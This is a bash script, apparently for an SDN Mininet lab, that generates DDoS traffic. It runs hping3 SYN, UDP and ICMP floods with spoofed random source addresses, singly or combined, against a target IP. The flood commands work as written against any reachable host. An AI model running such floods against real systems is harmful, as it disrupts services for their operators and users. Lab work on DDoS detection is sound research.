#!/usr/bin/env bash
# ==============================================================================
# Attack Traffic Generator for SDN Mininet Lab
# Supports TCP SYN Flood, UDP Flood, and ICMP Ping Flood
# ==============================================================================

ATTACK_TYPE=${1:-syn}
TARGET_IP=${2:-10.0.0.4}
DURATION=${3:-20}
TARGET_PORT=80

echo "=========================================================="
echo "[ATTACK] SDN DDoS Attack Traffic Generator"
echo "[ATTACK] Type: ${ATTACK_TYPE^^}"
echo "[ATTACK] Target: ${TARGET_IP}"
echo "[ATTACK] Duration: ${DURATION}s"
echo "=========================================================="

# Check if hping3 is available
HPING3_BIN=$(command -v hping3 || true)

run_syn_flood() {
    echo "[ATTACK] Launching TCP SYN Flood on ${TARGET_IP}:${TARGET_PORT}..."
    if [ -n "$HPING3_BIN" ]; then
        timeout "${DURATION}" hping3 -S -p "${TARGET_PORT}" --flood --rand-source "${TARGET_IP}" 2>/dev/null || true
    else
        echo "[WARN] hping3 not found. Falling back to Python traffic generator..."
        python3 traffic/traffic_generator.py --type syn --target "${TARGET_IP}" --port "${TARGET_PORT}" --duration "${DURATION}"
    fi
}

run_udp_flood() {
    TARGET_PORT=53
    echo "[ATTACK] Launching UDP Flood on ${TARGET_IP}:${TARGET_PORT}..."
    if [ -n "$HPING3_BIN" ]; then
        timeout "${DURATION}" hping3 --udp -p "${TARGET_PORT}" --flood --rand-source "${TARGET_IP}" 2>/dev/null || true
    else
        echo "[WARN] hping3 not found. Falling back to Python traffic generator..."
        python3 traffic/traffic_generator.py --type udp --target "${TARGET_IP}" --port "${TARGET_PORT}" --duration "${DURATION}"
    fi
}

run_icmp_flood() {
    echo "[ATTACK] Launching ICMP Ping Flood on ${TARGET_IP}..."
    if [ -n "$HPING3_BIN" ]; then
        timeout "${DURATION}" hping3 --icmp --flood --rand-source "${TARGET_IP}" 2>/dev/null || true
    else
        echo "[WARN] hping3 not found. Falling back to Python traffic generator..."
        python3 traffic/traffic_generator.py --type icmp --target "${TARGET_IP}" --duration "${DURATION}"
    fi
}

case "${ATTACK_TYPE,,}" in
    syn)
        run_syn_flood
        ;;
    udp)
        run_udp_flood
        ;;
    icmp)
        run_icmp_flood
        ;;
    all)
        echo "[ATTACK] Executing multi-vector combined flood..."
        run_syn_flood &
        PID_SYN=$!
        run_udp_flood &
        PID_UDP=$!
        run_icmp_flood &
        PID_ICMP=$!
        wait $PID_SYN $PID_UDP $PID_ICMP
        ;;
    *)
        echo "[ERROR] Unknown attack type '${ATTACK_TYPE}'. Valid options: syn, udp, icmp, all"
        exit 1
        ;;
esac

echo "=========================================================="
echo "[ATTACK] Attack cycle finished on ${TARGET_IP}."
echo "=========================================================="
